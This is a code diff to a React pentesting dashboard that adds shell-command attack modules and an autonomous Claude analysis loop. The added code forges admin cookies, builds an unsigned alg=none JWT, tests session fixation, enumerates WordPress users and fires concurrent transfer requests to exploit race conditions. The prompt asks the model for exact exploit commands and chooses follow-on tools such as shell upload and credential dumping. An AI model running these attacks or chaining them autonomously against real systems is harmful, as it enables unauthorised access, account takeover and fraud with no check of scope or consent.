@@ -1025,8 +1025,9 @@ const TOOL_BINS = {
   nuclei_fast: 'nuclei',  nuclei_exploit: 'nuclei', sqli_scan: 'sqlmap', xss_check: 'nuclei',
   cors_check: 'nuclei',   js_analyze: 'whatweb',   dir_fuzz: 'gobuster', ssrf_check: 'nuclei',
   lfi_test: 'nuclei',     shell_upload: 'curl',    cred_dump: 'sqlmap',  xss_inject: 'curl',
-  testssl: 'testssl.sh',  hydra: 'hydra',          ssti_check: 'nuclei', jwt_check: 'nuclei',
-  admin_takeover: 'nuclei',
+  testssl: 'testssl.sh',  hydra: 'hydra',     ssti_check: 'nuclei', jwt_check: 'nuclei',
+  admin_takeover: 'nuclei', cookie_tamper: 'curl', session_test: 'nuclei',
+  wpscan: 'wpscan',  race_cond: 'curl',
 };
 
 function PentestView({ apiKey, mcpUrl, mcpTools }) {
@@ -1042,13 +1043,14 @@ function PentestView({ apiKey, mcpUrl, mcpTools }) {
     js_analyze: false, dir_fuzz: false,    ssrf_check: false,  lfi_test: false,
     shell_upload: false, cred_dump: false,  xss_inject: false,
     testssl: false, hydra: false, ssti_check: false, jwt_check: false, admin_takeover: false,
+    cookie_tamper: false, session_test: false, wpscan: false, race_cond: false,
   });
   const [autoMode,   setAutoMode]   = useState(false);
   const [xssCallback,setXssCallback]= useState('');
   const PRIMARY   = ['subfinder','httpx','ghauri','ffuf','aquatone','burp_suite'];
-  const SECONDARY = ['naabu_scan','katana_crawl','nuclei_fast','nuclei_exploit','sqli_scan','xss_check','cors_check','js_analyze','dir_fuzz','ssrf_check','lfi_test','testssl','ssti_check','jwt_check','admin_takeover'];
-  const EXPLOIT   = ['shell_upload','cred_dump','xss_inject','hydra'];
-  const AUTO_TOOLS = ['subfinder','httpx','naabu_scan','nuclei_fast','nuclei_exploit','ffuf','sqli_scan','xss_check','cors_check','ssrf_check','lfi_test','js_analyze','ghauri','testssl','ssti_check','jwt_check','admin_takeover'];
+  const SECONDARY = ['naabu_scan','katana_crawl','nuclei_fast','nuclei_exploit','sqli_scan','xss_check','cors_check','js_analyze','dir_fuzz','ssrf_check','lfi_test','testssl','ssti_check','jwt_check','admin_takeover','session_test','wpscan'];
+  const EXPLOIT   = ['shell_upload','cred_dump','xss_inject','hydra','cookie_tamper','race_cond'];
+  const AUTO_TOOLS = ['subfinder','httpx','naabu_scan','nuclei_fast','nuclei_exploit','ffuf','sqli_scan','xss_check','cors_check','ssrf_check','lfi_test','js_analyze','ghauri','testssl','ssti_check','jwt_check','admin_takeover','session_test'];
   const logRef = useRef(null);
 
   useEffect(() => {
@@ -1099,6 +1101,23 @@ function PentestView({ apiKey, mcpUrl, mcpTools }) {
     ssti_check:     { tool: 'nuclei',  args: (t) => ({ target: t, templates: 'ssti,injection', severity: 'critical,high,medium' }) },
     jwt_check:      { tool: 'nuclei',  args: (t) => ({ target: t, templates: 'token,exposures', severity: 'critical,high,medium' }) },
     admin_takeover: { tool: 'nuclei',  args: (t) => ({ target: t, templates: 'takeovers,default-logins,exposed-panels', severity: 'critical,high,medium,low' }) },
+    cookie_tamper:  { tool: 'shell',   args: (t) => ({ command: `
+TARGET="${t}"
+echo "=== COOKIE RECON ==="
+curl -si "$TARGET" | grep -i 'set-cookie\|cookie' | head -20
+echo "=== TESTING role=admin ==="
+curl -si "$TARGET" -H "Cookie: role=admin; isAdmin=true; admin=1; user_id=1" | head -30
+echo "=== TESTING JWT alg=none ==="
+PAYLOAD=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=')
+DATA=$(echo -n '{"role":"admin","user_id":1}' | base64 | tr -d '=')
+curl -si "$TARGET" -H "Authorization: Bearer $PAYLOAD.$DATA." | head -20
+echo "=== TESTING session fixation ==="
+curl -si "$TARGET" -H "Cookie: session=AAAAAAAAAAAAAAAA" | head -20
+`.trim() }) },
+    session_test:   { tool: 'nuclei',  args: (t) => ({ target: t, templates: 'token,session,exposures,misconfiguration', severity: 'critical,high,medium' }) },
+    wpscan:         { tool: 'shell',   args: (t) => ({ command: `wpscan --url "${t}" --enumerate vp,u,ap --no-banner 2>/dev/null | head -100` }) },
+    race_cond:      { tool: 'shell',   args: (t) => ({ command: `echo "=== RACE CONDITION TEST ==="
+for i in $(seq 1 10); do curl -si -X POST "${t}" -d 'amount=1000&action=transfer' -H 'Content-Type: application/x-www-form-urlencoded' -o /dev/null -w "%{http_code} " & done; wait; echo` }) },
   };
 
   const runToolParallel = async (selected, tgt) => {
@@ -1151,12 +1170,23 @@ function PentestView({ apiKey, mcpUrl, mcpTools }) {
     }
 
     // Claude analysis
-    const ALL_EXPLOIT_TOOLS = 'shell_upload,cred_dump,xss_inject,nuclei_exploit,sqli_scan,lfi_test,ssrf_check,ghauri';
-    const buildPrompt = (results, rnd) =>
-      `TARGET: ${target}\nROUND: ${rnd}\n\nRESULTADOS:\n${results.map(r => `## ${r.key}\n${r.out}`).join('\n\n')}\n\n`
+    const ALL_EXPLOIT_TOOLS = 'shell_upload,cred_dump,xss_inject,nuclei_exploit,sqli_scan,lfi_test,ssrf_check,ghauri,cookie_tamper,session_test,hydra,wpscan,race_cond,testssl,ssti_check,jwt_check,admin_takeover';
+    const buildPrompt = (results, rnd) => {
+      const techHints = results.find(r => r.key === 'httpx' || r.key === 'js_analyze')?.out || '';
+      const techContext = [
+        techHints.match(/wordpress/i)  ? 'WordPress detected — use wpscan, xmlrpc, wp-login brute' : '',
+        techHints.match(/php/i)         ? 'PHP detected — test LFI, RFI, type juggling, deserialization' : '',
+        techHints.match(/jwt|bearer/i)  ? 'JWT found — test alg:none, weak secret, kid injection' : '',
+        techHints.match(/cookie/i)      ? 'Cookies found — run cookie_tamper, session_test' : '',
+        techHints.match(/apache|nginx/i)? 'Web server found — check version CVEs, path traversal' : '',
+        techHints.match(/mysql|mariadb/i)?'Database found — run cred_dump, ghauri' : '',
+        techHints.match(/upload/i)      ? 'Upload found — run shell_upload with bypass techniques' : '',
+      ].filter(Boolean).join('\n');
+      return `TARGET: ${target}\nROUND: ${rnd}\n${ techContext ? `\nTECH CONTEXT:\n${techContext}\n` : ''}\nRESULTADOS:\n${results.map(r => `## ${r.key}\n${r.out}`).join('\n\n')}\n\n`
       + (autoMode
-        ? `Analisa como pentester ofensivo elite. Responde APENAS em JSON:\n{"findings":[{"severity":"critical|high|medium|low","title":"...","desc":"...","cve":"CVE-XXXX-XXXX ou null","exploitable":true|false}],"next_tools":[tools a executar agora de: ${ALL_EXPLOIT_TOOLS}],"status":"continue ou done se não houver mais a explorar","report":"relatório markdown completo com todas as vulns, CVEs e recomendações"}`
-        : `Cria relatório com: vulnerabilidades, severidade, CVEs relevantes, recomendações.`);
+        ? `Analisa como APEX pentester elite. Cobre OWASP Top 10 2025. Verifica cookies, sessions, IDOR, business logic, injection, crypto. Responde APENAS em JSON:\n{"findings":[{"severity":"critical|high|medium|low","title":"...","desc":"...","cve":"CVE-XXXX-XXXX ou null","exploitable":true|false,"attack":"comando exato para explorar"}],"next_tools":[de: ${ALL_EXPLOIT_TOOLS}],"status":"continue|done","report":"relatorio markdown profissional completo"}`
+        : `Analisa como APEX pentester elite. Cobre todos os vetores OWASP Top 10 2025. Inclui: cookies/sessions, IDOR, business logic, injection, cripto, autenticacao. Relatorio profissional com CVEs, CVSS, exploit commands, e remediacoes.`);
+    };
 
     let round = 0;
     const maxRounds = autoMode ? 5 : 1;
